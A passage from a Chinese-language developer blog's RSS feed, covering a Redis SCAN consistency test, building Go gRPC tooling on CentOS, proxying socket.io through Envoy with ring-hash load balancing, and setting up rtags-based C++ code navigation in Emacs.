<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">console.log("scan#" + scan_round + " scan " + results.length </span><span style="color: #969896; font-style: italic; text-decoration: underline;">+ " values");</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   setTimeout(done, 5);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, <span style="color: #b5bd68;">function</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> cursor &gt; 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">throw</span> err;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">count_error</span> = <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (results.length != (max - min + 1)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (results.length &lt; (max - min + 1)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">"scan#"</span> + scan_round + <span style="color: #8abeb7;">" Expected "</span> + (max - m<span style="text-decoration: underline;">in + 1) + </span><span style="color: #8abeb7; text-decoration: underline;">" values, Got "</span><span style="text-decoration: underline;"> + results.length);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   count_error = <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"scan#"</span> + scan_round + <span style="color: #8abeb7;">" Expected "</span> + (max - mi<span style="text-decoration: underline;">n + 1) + </span><span style="color: #8abeb7; text-decoration: underline;">" values, Got "</span><span style="text-decoration: underline;"> + results.length);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!count_error) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   results.sort((a, b) =&gt; parseInt(a.substring(prefix_length), 10) <span style="text-decoration: underline;">- parseInt(b.substring(prefix_length), 10));</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">uniq_results</span> = _.sortedUniq(results);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (uniq_results.length != results.length) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"scan#"</span> + scan_round + <span style="color: #8abeb7;">" Expected 0 duplicated </span><span style="color: #8abeb7; text-decoration: underline;">values, Got "</span><span style="text-decoration: underline;"> + (results.length - uniq_results.length));</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">result_error</span> = <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> (<span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">i</span> = 0; i &lt;= (max - min); ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (parseInt(results[i].substring(prefix_length), 10) != (mi<span style="text-decoration: underline;">n + i)) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">console.log("results: " + results.toString());</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">"scan#"</span> + scan_round + <span style="color: #8abeb7;">" value#"</span> + i + <span style="color: #8abeb7;">" E</span><span style="color: #8abeb7; text-decoration: underline;">xpected "</span><span style="text-decoration: underline;"> + results[i].substring(0, prefix_length) + (min + i) + </span><span style="color: #8abeb7; text-decoration: underline;">", Got "</span><span style="text-decoration: underline;"> + results[i]);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   result_error = <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!result_error) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">"scan#"</span> + scan_round + <span style="color: #8abeb7;">" OK"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ++scan_round;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   scan(client);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

init(<span style="color: #b5bd68;">function</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   write(<span style="color: #81a2be;">null</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   scan(<span style="color: #81a2be;">null</span>);
});
</pre>
</div>

<p>
测试表明，取决于数据集变化的幅度，变化越大的数据集，获取到的结果偏差越大。
但是获取到的记录数终始相差不大， <code>10</code> 万条记录偏差 <code>+-200</code> 左右，前面遇到的数据
记录数急剧减少可能是其它问题引起，如：计算出的记录数确实是有剧减。
</p>

<p>
记录数偏差不大可能是因为 <code>Redis</code> 在存储 <code>Sets</code> 数据时是有排序的， <code>scan</code> 使用的
<code>cursor</code> 类似 <code>offset</code> ，所以上一个数据集的 <code>cursor</code> 用于查询下一个数据集时偏差也
不会太大。
</p>

<p>
但是这始终是一个问题，一个稳健的系统不应该有未定义行为。一个可行的解决方案是不要
使用 <code>rename</code> ，而是在正式的 <code>key</code> 中保存临时 <code>key</code> ，查询时先从正式的 <code>key</code> 取
到真正保存数据的临时 <code>key</code> ，再从临时 <code>key</code> 中取数据，只要确保每次计算都使用不同
的临时 <code>key</code> 就可以避免数据访问冲突导致的未定义行为。这样子改动后，Redis 中会保
存多份临时数据，需要设置合理的过期的时间，避免占用大量内存。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 下 Go gRPC 编译环境搭建]]></title>
            <link>/article/centos-4e0b-go-grpc-7f168bd173af5883642d5efa.html</link>
            <guid>/article/centos-4e0b-go-grpc-7f168bd173af5883642d5efa.html</guid>
            <pubDate>Tue, 12 Dec 2017 11:28:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
安装 <code>protobuf</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/google/protobuf.git
<span style="color: #b294bb;">cd</span> protobuf
git checkout v3.4.1 -b v3.4.1
./autogen.sh
./configure
make
make install
</pre>
</div></li>

<li><p>
安装 <code>protobuf go 插件</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">go get -u github.com/golang/protobuf/{proto,protoc-gen-go}
</pre>
</div>

<p>
在 <code>~/.profile</code> 中将 <code>protoc-gen-go</code> 所在路径加到 <code>PATH</code> 环境变量中
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"`go env GOPATH`/bin:$PATH"</span>
</pre>
</div>

<p>
最新版本的 <code>protoc-gen-go</code> 默认生成的 protobuf 4.x 的代码，我们的项目目前还
是使用 protobuf 3.x，这会导致生成的代码无法通过编译，错误信息
</p>
<pre class="example">
xxx.pb.go:2799:21: c.cc.NewStream undefined (type *grpc.ClientConn has no field or method NewStream)
xxx.pb.go:2831:13: c.cc.Invoke undefined (type *grpc.ClientConn has no field or method Invoke)
</pre>

<p>
需要改回生成 protobuf 3.x 的代码，修改
<code>github.com/golang/protobuf/protoc-gen-go/grpc/grpc.go</code>
</p>
<div class="org-src-container">
<pre class="src src-go"><span style="color: #b5bd68;">const</span> generatedCodeVersion = 4
</pre>
</div>
<p>
改为 
</p>
<div class="org-src-container">
<pre class="src src-go"><span style="color: #b5bd68;">const</span> generatedCodeVersion = 3
</pre>
</div>

<p>
重新编译安装 <code>protoc-gen-go</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> github.com/golang/protobuf
make install
</pre>
</div></li>

<li><p>
参考
</p>

<p>
<a href="http://www.jianshu.com/p/e2435b834d68">golang开发环境搭建-安装go 和 grpc - 简书</a>
</p>

<p>
<a href="https://github.com/golang/protobuf/issues/264">grpc version conflict · Issue #264 · golang/protobuf</a>
</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 Envoy 做为 socket.io 的前端代理]]></title>
            <link>/article/4f7f7528-envoy-505a4e3a-socket.io-7684524d7aef4ee37406.html</link>
            <guid>/article/4f7f7528-envoy-505a4e3a-socket.io-7684524d7aef4ee37406.html</guid>
            <pubDate>Mon, 20 Nov 2017 06:39:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgc2b5761" class="outline-2">
<h2 id="orgc2b5761">示例 socket.io 项目</h2>
<div class="outline-text-2" id="text-orgc2b5761">
<ul class="org-ul">
<li><p>
编译
</p>

<div class="org-src-container">
<pre class="src src-sh">go get github.com/tangxinfa/envoy-socket.io-example
<span style="color: #b294bb;">cd</span> $<span style="color: #f0c674;">GOPATH</span>/src/github.com/tangxinfa/envoy-socket.io-example
glide install
go build
</pre>
</div></li>

<li><p>
运行
</p>

<div class="org-src-container">
<pre class="src src-sh">./envoy-socket.io-example -addr 127.0.0.1:8001 -logtostderr
</pre>
</div></li>

<li><p>
用浏览器打开 <code>http://localhost:8001</code>
</p>

<p>
正常情况下，会收到 <code>welcome</code> 消息，表示 <code>socket.io</code> 连接成功，可以在下方的编辑框输入内容，服务器会 echo 回来。
这是客户端直接 socket.io 服务，接下来将展示使用 Envoy 做为前端代理来访问后端的 socket.io 服务。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org69d6e72" class="outline-2">
<h2 id="org69d6e72">修复 Envoy 的 Websocket 相关 Bug</h2>
<div class="outline-text-2" id="text-org69d6e72">
<p>
之前的 Envoy 版本为
</p>
<pre class="example">
commit 3e43c2225c8882918b36b4b7c7bb55c6af2db929
Author: Greg Greenway &lt;ggreenway@users.noreply.github.com&gt;
Date:   Wed Nov 15 14:48:38 2017 -0800

Fix v2 TcpProxy config (#2065)

Signed-off-by: Greg Greenway &lt;ggreenway@apple.com&gt;
</pre>

<p>
存在两个问题导致 Websocket 不可用：
</p>

<ul class="org-ul">
<li><p>
Connection 请求头包含多个值时未能正确处理，导致未正确判断出 Websocket 请求
</p>

<p>
Firefox 发起的 Websocket 请求 Connection 头的值为： <code>keep-alive, Upgrade</code> 。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
Envoy 向 Upstream 发起的 Websocket 请求多了一个 <code>transfer-encoding: chunked</code> 请求头
</p>

<p>
由于请求体是空的，所以是一个无效的 HTTP 请求。
</p></li>
</ul>


<p>
我提交了 Pull Request <a href="https://github.com/envoyproxy/envoy/pull/2070">#2070</a> ，已合到 <code>master</code> 分支，该问题已修复。
</p>
</div>
</div>

<div id="outline-container-org23c8c74" class="outline-2">
<h2 id="org23c8c74">将 Envoy 做为 socket.io 服务前端代理</h2>
<div class="outline-text-2" id="text-org23c8c74">
<ul class="org-ul">
<li><p>
启动 Envoy
</p>

<p>
使用是的修复 BUG 后的 Envoy。
</p>

<div class="org-src-container">
<pre class="src src-sh">~/Opensource/envoy/bazel-bin/source/exe/envoy-static --log-level trace --config-<span style="text-decoration: underline;">path ./envoy.json</span>
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
用浏览器打开 <code>http://localhost:9001</code>
</p>

<p>
正常情况下，会收到 <code>welcome</code> 消息，表示 socket.io 连接成功，可以在下方的编辑框输入内容，服务器会 echo 回来。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org179ba66" class="outline-2">
<h2 id="org179ba66">将 Envoy 做为 socket.io 服务集群前端代理</h2>
<div class="outline-text-2" id="text-org179ba66">
<p>
在后台服务为集群的情况下，Envoy 会通过负载均衡将请求调度到所有服务结点，
对于无状态服务，不管 Envoy 使用什么样的负载均衡策略都可以正常工作，
但是对于有状态的服务，则要求将一个用户的请求总是调度到同一个服务结点。
</p>

<blockquote>
<p>
Socket.IO never assumes that WebSocket will just work, because in practice there’s a good chance that it won’t. Instead, it establishes a connection with XHR or JSONP right away, and then attempts to upgrade the connection to WebSocket. Compared to the fallback method which relies on timeouts, this means that none of your users will have a degraded experience.
</p>
</blockquote>
<p>
引用自 <a href="https://mashhurs.wordpress.com/2016/09/30/polling-vs-websocket-transport/">Socket.IO Polling vs. WebSocket Transport – on Balancing Methods</a>。
</p>

<p>
socket.io 的 <code>transports</code> 选项默认值为 <code>['polling', 'websocket']</code> ，
也就是说首先发一个 HTTP 轮询请求，根据响应决定是否升级到使用 <code>websocket</code> ，
这样在 Websocket 可用的情况下，会有两次 HTTP 交互，需确保两次 HTTP 交互
调度到同一个服务结点，socket.io 连接才能建立成功。
</p>

<p>
Envoy 本身支持多种负载均衡策略，适合这里的场景是 <code>Ring hash</code> 。
</p>

<blockquote>
<p>
Ring hash
</p>

<p>
The ring/modulo hash load balancer implements consistent hashing to upstream hosts. The algorithm is based on mapping all hosts onto a circle such that the addition or removal of a host from the host set changes only affect 1/N requests. This technique is also commonly known as “ketama” hashing. The consistent hashing load balancer is only effective when protocol routing is used that specifies a value to hash on. Currently the only implemented mechanism is to hash via HTTP header values in the HTTP router filter. 
</p>
</blockquote>

<p>
遗憾的是 Envoy 的 Websocket 实现过于简陋，当检测到 <code>Websocket</code> 升级请求时，
它以 <code>TcpProxy</code> 的方式连接上游服务器，检测到非 <code>Websocket</code> 升级请求时，
会正常地做为 HTTP 请求进行处理。由于 <code>TcpProxy</code> 只支持随机 Hash 算法选择上游服务结点，
会导致默认情况下 socket.io 连接无法建立。
</p>

<p>
通过指定 socket.io 的 <code>transports</code> 选项值为 <code>['websocket', 'polling']</code> ，
也就是首先尝试建立 <code>websocket</code> 连接，失败时再降级为 <code>polling</code> ，能够解决这个问题。
</p>

<p>
Envoy 的 <code>Ring hash</code> 是根据配置的请求头来计算 Hash 值的，刚刚有一个按特定 Cookie 计算 Hash 值的
Pull Request <a href="https://github.com/envoyproxy/envoy/pull/1766">Implement cookie hashing for v2 API #1766</a> 已经合并到 master 分支，官方文档方面还没有更新，
本文暂不采用。
</p>

<p>
一般 Web 前端都是通过自定义请求头或者 Cookie 中的特定字段来标识一个用户，由于 Cookie
可能会在交互过程中发生变化，因此不适合用于计算 Hash 值，而 Websocket 升级请求又不支持自定义请求头，
因此这两种常用的方式失效了。
</p>

<p>
另一个合理的选择是通过 <code>Referer</code> 请求头来计算 Hash，这是客户端网页的地址，不会在交互过程中变化，
只要想办法将用户的标识（如 ID）附在 URL 上，如：<a href="http://www.example.com/chat?uid=1234">http://www.example.com/chat?uid=1234</a> ，
就可以保证用户请求能够均衡地分布到所有服务结点上，同一用户的请求也会调度到同一个服务结点。
</p>

<p>
如下所示。
</p>

<ul class="org-ul">
<li><p>
启动服务集群
</p>

<div class="org-src-container">
<pre class="src src-sh">./envoy-socket.io-example -127.0.0.1:8002 -logtostderr &amp;
./envoy-socket.io-example -127.0.0.1:8003 -logtostderr &amp;
./envoy-socket.io-example -127.0.0.1:8004 -logtostderr &amp;
</pre>
</div></li>

<li><p>
启动 Envoy
</p>

<p>
使用是的修复 BUG 后的 Envoy。
</p>

<div class="org-src-container">
<pre class="src src-sh">~/Opensource/envoy/bazel-bin/source/exe/envoy-static --log-level trace --config-<span style="text-decoration: underline;">path ./envoy2.json</span>
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
用浏览器打开多个 <code>http://localhost:9002/index2.html</code> 页面
</p>

<p>
正常情况下，每个页面都会收到 <code>welcome</code> 消息，表示 socket.io 连接成功，可以在下方的编辑框输入内容，服务器会 echo 回来。</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[完美的 c++ 项目代码定义跳转]]></title>
            <link>/article/5b8c7f8e7684-c-987976ee4ee378015b9a4e498df38f6c.html</link>
            <guid>/article/5b8c7f8e7684-c-987976ee4ee378015b9a4e498df38f6c.html</guid>
            <pubDate>Wed, 15 Nov 2017 07:26:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
阅读代码时如果能够很方便地跳转到函数、类型定义处，会极大地提高效率。使用 grep 或
ctags 或 gtags 的问题在于给出的结果不够严谨，可能会给出很多候选，容易打断思路，
另一方面 c++ 本身语法非常复杂，继承、重载等会让选择正确的跳转处变得更加困难，
ctags 或 gtags 之类的静态代码分析工具对 c++ 的支持也相当有限。
</p>

<p>
clang 编译器较之 gcc 在进行代码分析方面提供了良好的支持，编译器给出的结果往往是
最正确和最丰富的。
</p>

<p>
本文描述了使用如何将 emacs 打造成阅读 c++ 代码的利器。
</p>

<div id="outline-container-org0e1c171" class="outline-2">
<h2 id="org0e1c171">编译数据库</h2>
<div class="outline-text-2" id="text-org0e1c171">
<p>
编译数据库（ <code>compile_commands.json</code> ）里面记录了每一个源代码文件对应的编译命令，
有了编译数据库就可以从 clang 编译器获取最详尽的代码分析数据，让代码跳转、自动完
成更加精确。
</p>

<p>
不同的构建工具可以使用相应的工具来生成编译数据库（ <code>compile_commands.json</code> ）。
</p>
</div>

<div id="outline-container-org951ebf1" class="outline-3">
<h3 id="org951ebf1">bazel</h3>
<div class="outline-text-3" id="text-org951ebf1">
<ul class="org-ul">
<li><p>
安装
</p>

<p>
使用 <code>Bazel And Compile Commands</code> 脚本可以很方便地为 Bazel 构建项目生成 compile_commands.json 
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/vincent-picaud/Bazel_and_CompileCommands.git
</pre>
</div></li>

<li><p>
生成
</p>

<div class="org-src-container">
<pre class="src src-sh">../Bazel_and_CompileCommands/setup_compile_commands.sh
../Bazel_and_CompileCommands/create_compile_commands.sh //...
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-orgb7cba2f" class="outline-3">
<h3 id="orgb7cba2f">make</h3>
<div class="outline-text-3" id="text-orgb7cba2f">
<p>
<a href="https://github.com/rizsotto/Bear">Bear</a> 是一个生成生成编译数据库的工具，其工作原理是监视编译工具（如：make）调用的编译命令，
是一种很通用的方案。
</p>

<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S bear
</pre>
</div></li>

<li><p>
生成
</p>

<div class="org-src-container">
<pre class="src src-sh">bear make
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-orga0167a8" class="outline-3">
<h3 id="orga0167a8">cmake</h3>
<div class="outline-text-3" id="text-orga0167a8">
<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S cmake
</pre>
</div></li>

<li><p>
生成
</p>

<div class="org-src-container">
<pre class="src src-sh">cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=ON .
</pre>
</div></li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org36a40ef" class="outline-2">
<h2 id="org36a40ef"><a href="https://github.com/Andersbakken/rtags">rtags</a></h2>
<div class="outline-text-2" id="text-org36a40ef">
<blockquote>
<p>
RTags is a client/server application that indexes C/C++ code and keeps a persistent file-based database of references, declarations, definitions, symbolnames etc. 
</p>
</blockquote>

<p>
<a href="https://github.com/Andersbakken/rtags">rtags</a> 是基于 clang，根据编译器提供的信息可以实现精确的查找定义、引用及调用、
列出派生类等。
</p>
</div>

<div id="outline-container-orgb53b7d4" class="outline-3">
<h3 id="orgb53b7d4">启动后台服务</h3>
<div class="outline-text-3" id="text-orgb53b7d4">
<div class="org-src-container">
<pre class="src src-sh">nohup rdm &amp;
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd2d2a15" class="outline-3">
<h3 id="orgd2d2a15">提交项目信息到后台服务</h3>
<div class="outline-text-3" id="text-orgd2d2a15">
<p>
由于 bazel 会将代码通过软链接放到一个沙箱中进行编译，导致生成的编译数据库中代码目录与实际编辑的路径不一致，
使用 rtags 查找定义时会报 "/xxx/xxx.cpp not indexed" 错误，可以通过提交项目信息时指定 <code>--project-root</code> 进行修正。
</p>

<div class="org-src-container">
<pre class="src src-sh">rc -J . --project-root $<span style="color: #f0c674;">PWD</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org79a9e69" class="outline-3">
<h3 id="org79a9e69">在 emacs 中整合以上工具</h3>
<div class="outline-text-3" id="text-org79a9e69">
<p>
请参考 <a href="https://github.com/Andersbakken/rtags#elisp">https://github.com/Andersbakken/rtags#elisp</a>
</p>

<p>
以下是我的配置，首先需要安装这些 emacs 包： <code>rtags</code> <code>helm-rtags</code>
<code>company-rtags</code> <code>flycheck-rtags</code>
</p>
<div class="org-src-container">
<pre class="src src-emacs-lisp"><span style="color: #969896; font-style: italic;">;;;; </span><span style="color: #969896; font-style: italic;">rtags</span>
(<span style="color: #b5bd68;">defun</span> <span style="color: #de935f;">my-rtags-load-compile-commands-command</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"rtags load compile_commands.json command"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">;; </span><span style="color: #969896; font-style: italic;">compile_commands.json generate by https://github.com/vincent-picaud/Bazel_a</span><span style="color: #969896; font-style: italic; text-decoration: underline;">nd_CompileCommands</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">;; </span><span style="color: #969896; font-style: italic;">will refer source code from bazel's sandbox, must use "--project-root" to f</span><span style="color: #969896; font-style: italic; text-decoration: underline;">ix it.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> (<span style="color: #b5bd68;">let</span> ((project-root default-directory)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   (tmp-project-root <span style="color: #8abeb7;">""</span>))
